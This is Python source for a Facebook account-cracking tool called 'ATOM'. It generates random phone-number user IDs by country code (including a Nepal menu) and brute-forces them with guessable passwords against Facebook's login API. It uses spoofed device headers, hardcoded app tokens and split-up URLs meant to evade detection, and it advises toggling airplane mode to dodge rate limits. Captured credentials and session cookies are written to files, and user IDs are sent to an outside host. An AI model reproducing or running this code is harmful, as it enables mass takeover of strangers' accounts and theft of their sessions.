        psl = int(input(f'{red}[{white}√{red}] {green}INPUT PASS LIMITS {white}▶︎ \x1b[38;5;208m'));linex()
        print(f"{red}[{white}√{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
        linex()
        for i in range(psl):
            plist.append(input(f'{red}[{white}√{red}] {green}PASSWORD NO.{i+1} {white}▶︎ \x1b[38;5;208m'));linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with ThreadPoolExecutor(max_workers=30) as error:
        clear()
        print(f'{red}[{white}√{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
        print(f'{red}[{white}√{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
        print(f'{red}[{white}√{red}]{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');linex()
        for love in user:
            ids = code + love
            ax = ids[:8]
            bx = ids[:7]
            cx = ids[:6]
            xa = love[1:]
            tl = len(user)
            xb = love[2:]
            psd = plist
            if mtd in ['A','a','01','1']:error.submit(randm, ids, psd,tl)
            elif mtd in ['B','b','02','2']:error.submit(randm1, ids, psd,tl)
            elif mtd in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
            elif mtd in ['D','d','04','4']:error.submit(randm3, ids, psd,tl)
    print('')
    print(f'\r{white}================================================')
    print(f'{red}[{white}√{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f'{red}[{white}√{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
    print(f'{red}[{white}√{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
    print(f'\r{white}================================================')
    input(f"{red}[{white}√{red}]{green} PRESS ENTER TO BACK MENU ")
    menu()
 #====================[NEPAL RANDOM]==========================
def ___NP___():
    clear()
    print(f'{red}[{white}◆{red}] {green}SIM CODES {white}▶︎ {red}[{white}+977 ETC.{red}]'); linex()
    code = input(f'{red}[{white}◆{red}]{green} Choice    {white}▶︎ \x1b[38;5;208m')
    clear()
    print(f'{red}[{white}◆{red}] {green}EXAMPLE {white}  ▶︎ {red}[{white}10000 20000 30000{red}]');linex()
    limit = int(input(f'{red}[{white}◆{red}] {green}LIMITS    {white}▶︎ \x1b[38;5;208m'))
    linex()
    plist = []
    clear()
    print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");linex()
    mtd=input(f"\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
    clear()
    print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    print(f"\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD {red}(BEST)");linex()
    __CH__ = input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
    if __CH__ in ["A","a","1"]:
        plist.append('first6')
        plist.append('last6')
        plist.append('first7')
        plist.append('last7')
        plist.append('first8')
        plist.append('last8')
        plist.append('last11')
        plist.append("nepal12")
        plist.append("nepal123")
        plist.append("nepal1234")
        plist.append("nepal12345")
        plist.append("maya123")
        plist.append("kathmandu")
        plist.append("pokhara")
        plist.append("tamang")
        plist.append("maya1234")
        plist.append("tamang12345")
        plist.append("tamang123")
        plist.append("nepal@123")
        plist.append("kathmandu123")
    elif __CH__ in ["B","b","2"]:
        clear()
        psl = int(input(f'{red}[{white}√{red}] {green}INPUT PASS LIMITS {white}▶︎ \x1b[38;5;208m'));linex()
        print(f"{red}[{white}√{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
        linex()
        for i in range(psl):
            plist.append(input(f'{red}[{white}√{red}] {green}PASSWORD NO.{i+1} {white}▶︎ \x1b[38;5;208m'));linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    with ThreadPoolExecutor(max_workers=30) as error:
        clear()
        print(f'{red}[{white}√{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
        print(f'{red}[{white}√{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
        print(f'{red}[{white}√{red}]{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');linex()
        for love in user:
            ids = code + love
            ax = ids[:8]
            bx = ids[:7]
            cx = ids[:6]
            xa = love[1:]
            tl = len(user)
            xb = love[2:]
            psd = plist
            if mtd in ['A','a','01','1']:error.submit(randm, ids, psd,tl)
            elif mtd in ['B','b','02','2']:error.submit(randm1, ids, psd,tl)
            elif mtd in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
            elif mtd in ['D','d','04','4']:error.submit(randm3, ids, psd,tl)
    print('')
    print(f'\r{white}================================================')
    print(f'{red}[{white}√{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f'{red}[{white}√{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
    print(f'{red}[{white}√{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
    print(f'\r{white}================================================')
    input(f"{red}[{white}√{red}]{green} PRESS ENTER TO BACK MENU ")
    menu()
#__________________| FILE METHOD M1 |__________________#
def api1(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{G}[{R}ATOM-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = random.choice(ugen)
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        apk = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', '350685531728|62f8ce9f74b12f84c123cc23437a4a32', '6628568379|c1e620fa708a1d5696fb991c1bde5662', '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae', '1348564698517390|007c0a9101b9e1c8ffab727666805038']
                        app = random.choice(apk)
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        quality = random.choice(['POOR', 'MODERATE', 'GOOD', 'EXCELLENT'])
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                        #content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
                        headers={'User-Agent': ua,
'Accept-Encoding': 'gzip, deflate',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
'Connection': 'Keep-Alive',}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}ATOM-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/ATOM-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}ATOM-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ATOM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
                
            
#__________________| FILE METHOD M2 |__________________#
def api2(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{G}[{R}ATOM-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid' : str(uuid.uuid4()),
'format' : 'json',
'device_id' : str(uuid.uuid4()),
'email' : ids,
'password' : pas,
'generate_analytics_claim' : '1',
'community_id' : '',
'linked_guest_account_userid' :'',
'cpl' : 'true',
'try_num' : '1',
'family_device_id' : str(uuid.uuid4()),
'secure_family_device_id' : str(uuid.uuid4()),
'sim_serials' : ["00920088911210748054"],
'credentials_type' : 'password',
'fb4a_shared_phone_cpl_experiment' : 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
'fb4a_shared_phone_cpl_group' : 'enable_v3_at_risk',
'enroll_misauth' : 'false',
'generate_session_cookies' : '1',
'error_detail_type' : 'button_with_disabled',
'source' : 'login',
'generate_machine_id' : '1',
'jazoest' : '22377',
'meta_inf_fbmeta' : 'V2_UNTAGGED',
'advertiser_id' : str(uuid.uuid4()),
'encrypted_msisdn': '',
'currently_logged_in_userid' : '0',
'locale' : 'en_GB',
'client_country_code' : 'GB',
'fb_api_req_friendly_name' : 'authenticate',
'fb_api_caller_class' : 'Fb4aAuthHandler',
'api_key' : '882a8490361da98702bf97a021ddc14d',
'sig' : 'e5abae6d6564813bfadc6dcd42256834',
'access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
                        headers = {"User-Agent":ua,
"Accept-Encoding":"gzip, deflate",
"Connection":"keep-alive",
"Content-Type":"application/x-www-form-urlencoded",
"Host":"graph.facebook.com",
"X-FB-Net-HNI":str(random.randint(3e7,4e7)),
"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),
"X-FB-Connection-Type":"MOBILE.LTE",
"Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
"X-FB-Connection-Quality":"MOBILE.LTE",
"X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),
"X-Tigon-Is-Retry":"False",
"X-FB-Friendly-Name":"ViewerReactionsMutation",
"X-FB-Request-Analytics-Tags":"graphservice",
"X-FB-HTTP-Engine":"Liger",
"X-FB-Client-IP":"True",
"X-FB-Server-Cluster":"True",
"x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}

                        url = 'https://graph.facebook.com/method/auth.login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}ATOM-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/ATOM-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}ATOM-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ATOM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
  

#__________________| FILE METHOD M3 |__________________#     
def api3(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r{G}[{R}ATOM-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Dalvik/1.6.0 (Linux; U; Android 11; SM-A310N0 Build/MMB29K) [FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/282018885;FBDM/{density=2'+'.0,width='+'720,height='+'1280};FBLC/it_IT;FBRV/282418117;FBCR/Vodafone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310N0;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'email': ids,
'password': pas,
'generate_analytics_claims': '1',
'community_id': '',
'cpl': 'true',
'try_num': '1',
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'password',
'source': 'login',
'error_detail_type': 'button_with_disabled',
'enroll_misauth': 'false',
'generate_session_cookies': '1',
'generate_machine_id': '1',
'currently_logged_in_userid': '0',
'locale': 'it_IT',
'client_country_code': 'IT',
'fb_api_req_friendly_name': 'authenticate',
'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}

                        headers = {'User-Agent': ua,
'Accept-Encoding': 'gzip, deflate',
'Connection': 'close',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(2e4, 4e4)),
'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Connection-Type': 'WIFI',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',	
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/method/auth.login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}ATOM-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/ATOM-FILE-M3-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}ATOM-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ATOM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass        
#====================[RANDOM M1]==========================
def randm(ids,psd,tl):
    global oks,cps,loop
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ATOM-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
    sys.stdout.flush()
    try:
        for pas in psd:
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            pas = rmpassconf(ids,pas)
            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            ua = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845488;FBDM/{density=1.5,width=1200,height=1848};FBLC/en_US;FBRV/217831574;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T510;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            data={
            'adid':adid,
            'format':'json',
            'device_id':adid,
            'email':ids,
            'password':pas,
            "logged_out_id": str(uuid.uuid4()),
            "hash_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            'generate_analytics_claims':'1',
            'credentials_type':'password',
            'source':'login',
            "sim_country": "id",
            "network_country": "id",
            "relative_url": "method/auth.login",
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            "locale":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
            "client_country_code":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]), 
            'fb_api_req_friendly_name':'authenticate',
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
            head={
            'Authorization':f'OAuth {accessToken}',
            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-FB-device-group': str(random.randint(2000, 4000)),
            "X-FB-Friendly-Name": "ViewerReactionsMutation",
            "X-FB-Request-Analytics-Tags": "graphservice",
            'X-FB-Friendly-Name':'authenticate',
            'X-FB-Connection-Type':'unknown',
            'X-FB-connection-quality':'EXCELLENT',
            "X-Tigon-Is-Retry": "False",
            'User-Agent': ua,
            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
            'Accept-Encoding':'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            "X-FB-Client-IP": "True",
            "X-FB-Server-Cluster": "True",
            'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'htt'+'ps://b-'+'api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                if res == 'LIVE':
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ") 
                    oks.append(ids)
                    open('/sdcard/ATOM-M1-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                    break
            elif 'www.facebook.com' in q['error_msg']:
                cps.append(ids)
                print(f"\r\r{red}[{white}√{red}] {red}DIE {uid} | {pas} ")
                open('/sdcard/ATOM-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
        loop+=1
    except Exception as e:
        pass
#====================[RANDOM M2]==========================
def randm1(ids,psd,tl):
    global loop,oks,cps
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ATOM-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
    sys.stdout.flush()
    try:
        for pas in psd:
            accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            pas = rmpassconf(ids,pas)
            data = {
            'adid':adid,
            'format':'json',
            'device_id':adid,
            'email': ids,
            'password': pas,
            "logged_out_id": str(uuid.uuid4()),
            "hash_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            'generate_analytics_claims':'1',
            'credentials_type':'password',
            'source':'login',
            "sim_country": "id",
            "network_country": "id",
            "relative_url": "method/auth.login",
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            "locale":"en_US","client_country_code":"US",
            'fb_api_req_friendly_name':'authenticate',
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
            head ={
            'Authorization':f'OAuth {accessToken}',
            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
            "X-FB-Connection-Bandwidth": str(random.randint(10000000, 90000000)),
            "X-FB-Net-HNI": str(random.randint(10000, 90000)),
            "X-FB-SIM-HNI": str(random.randint(10000, 90000)),
            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-FB-device-group': str(random.randint(1000, 9000)),
            "X-FB-Friendly-Name": "ViewerReactionsMutation",
            "X-FB-Request-Analytics-Tags": "graphservice",
            'X-FB-Friendly-Name':'authenticate',
            'X-FB-Connection-Type':'unknown',
            'X-FB-connection-quality':'EXCELLENT',
            "X-Tigon-Is-Retry": "False",
            'User-Agent': SHAPTAR_BACHA(),
            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
            'Accept-Encoding':'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            "X-FB-Client-IP": "True",
            "X-FB-Server-Cluster": "True",
            'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https:'+'//b-api'+'.faceb'+'ook.com'+'/metho'+'d/auth.'+'login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                uid=str(q['uid'])
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ")
                    oks.append(ids)
                    open('/sdcard/ATOM-M2-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                    break
            elif 'www.facebook.com' in q['error_msg']:
                cps.append(ids)
                print(f"\r\r{red}[{white}√{red}] {red}DIE {uid} | {pas} ")
                open('/sdcard/ATOM-RN-DIE.txt','a').write(ids+'|'+pas+'\n')                
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
    
#====================[RANDOM M3]==========================
def randm2(ids,psd,tl):
    global loop,oks,cps
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ATOM-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
    sys.stdout.flush()
    try:
        for pas in psd:
            adid = str(uuid.uuid4())
            pas = rmpassconf(ids,pas)
            ua = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629362;FBDM/{density=2.75,width=1080,height=2150};FBLC/en_GB;FBRV/0;FBCR/Ooredoo;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/MI PLAY;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32" 
            data = {
            'adid':adid,
            'format':'json',
            'device_id':adid,
            'email':ids,
            'password':pas,
            "logged_out_id": str(uuid.uuid4()),
            "hash_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
